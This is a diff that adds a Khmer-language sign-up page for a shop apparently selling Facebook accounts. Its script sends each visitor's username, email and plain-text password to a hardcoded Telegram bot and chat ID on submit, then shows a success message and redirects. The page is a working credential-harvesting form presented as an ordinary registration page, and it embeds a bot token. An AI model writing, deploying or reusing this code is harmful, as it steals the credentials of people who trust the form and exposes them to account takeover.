@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ចុះឈ្មោះ - FB Accounts Store</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body {
+      background-color: #0f172a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .card {
+      background-color: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 16px;
+      padding: 32px 24px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+      text-align: center;
+    }
+    .brand-icon {
+      font-size: 40px;
+      margin-bottom: 8px;
+    }
+    h2 {
+      color: #ffffff;
+      font-size: 22px;
+      margin-bottom: 6px;
+    }
+    p.sub {
+      color: #94a3b8;
+      font-size: 13px;
+      margin-bottom: 24px;
+    }
+    .group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      color: #cbd5e1;
+      font-size: 13px;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      background: #0f172a;
+      border: 1.5px solid #334155;
+      border-radius: 10px;
+      color: #ffffff;
+      outline: none;
+      font-size: 14px;
+      transition: border-color 0.2s;
+    }
+    input:focus {
+      border-color: #2563eb;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #2563eb;
+      color: #ffffff;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 15px;
+      margin-top: 10px;
+      transition: background-color 0.2s;
+    }
+    .btn:hover {
+      background: #1d4ed8;
+    }
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="brand-icon">🌐</div>
+    <h2>ចុះឈ្មោះគណនី</h2>
+    <p class="sub">សូមចុះឈ្មោះជាមុនសិន ទើបអាចចូលទិញគណនីបាន</p>
+
+    <form id="regForm">
+      <div class="group">
+        <label>ឈ្មោះអ្នកប្រើ (Username)</label>
+        <input type="text" id="username" placeholder="ឧ. somnang01" required>
+      </div>
+      <div class="group">
+        <label>អ៊ីមែល (Email)</label>
+        <input type="email" id="email" placeholder="name@example.com" required>
+      </div>
+      <div class="group">
+        <label>ពាក្យសម្ងាត់ (Password)</label>
+        <input type="text" id="password" placeholder="បញ្ចូលពាក្យសម្ងាត់របស់អ្នក" required>
+      </div>
+      <button type="submit" class="btn" id="btnSubmit">ចុះឈ្មោះឥឡូវនេះ</button>
+    </form>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "8329430209:AAHb6rl0-s9MrG0R-IuHOAIfQAZWPsRG0qQ";
+    const TELEGRAM_CHAT_ID = "5915683588";
+
+    document.getElementById("regForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      const u = document.getElementById("username").value.trim();
+      const em = document.getElementById("email").value.trim();
+      const p = document.getElementById("password").value;
+      const btn = document.getElementById("btnSubmit");
+
+      btn.disabled = true;
+      btn.textContent = "កំពុងដំណើរការ...";
+
+      const regMsg = 
+        `👤 *មានអ្នកចុះឈ្មោះថ្មី (NEW REGISTER)!*\n` +
+        `---------------------------\n` +
+        `🧑 *Username:* \`${u}\`\n` +
+        `📧 *Email:* \`${em}\`\n` +
+        `🔑 *Password:* \`${p}\`\n` +
+        `⏰ *កាលបរិច្ឆេទ:* ${new Date().toLocaleString('km-KH')}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: regMsg, parse_mode: "Markdown" })
+        });
+      } catch (err) {
+        console.error("Telegram error:", err);
+      }
+
+      // កត់ត្រាឈ្មោះអ្នកប្រើ ហើយបញ្ជូនទៅ index.html
+      localStorage.setItem("shop_user", u);
+      alert("ការចុះឈ្មោះទទួលបានជោគជ័យ! សូមស្វាគមន៍មកកាន់ហាង។");
+      window.location.href = "index.html";
+    });
+  </script>
+</body>
+</html>
